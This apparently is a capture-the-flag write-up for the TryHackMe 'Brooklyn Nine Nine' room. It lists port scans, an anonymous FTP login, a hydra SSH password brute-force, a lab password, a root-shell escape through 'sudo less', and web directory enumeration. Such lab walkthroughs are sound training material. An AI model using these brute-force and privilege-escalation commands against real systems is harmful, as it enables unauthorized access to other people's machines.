# Brooklyn Nine Nine

**Room Link:** [https://tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>

### TCP/21 - FTP

anonymous login worked

**Kali**

```
ftp $VICTIM
Username: anonymous
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

### TCP/22 - SSH

**Kali**

```
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://$VICTIM
```

<figure><img src="../../.gitbook/assets/image (3) (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh jake@$VICTIM
Password: 987654321
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

## **Privlege Escalation**

**Victim**

```
sudo less /etc/profile
!/bin/sh
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



<figure><img src="../../.gitbook/assets/image (1) (10).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

I tried to see if I could get any more info from the image but I never did.

**Kali**

```
exiftool brooklyn99.jpg 
steghide info brooklyn99.jpg
```

















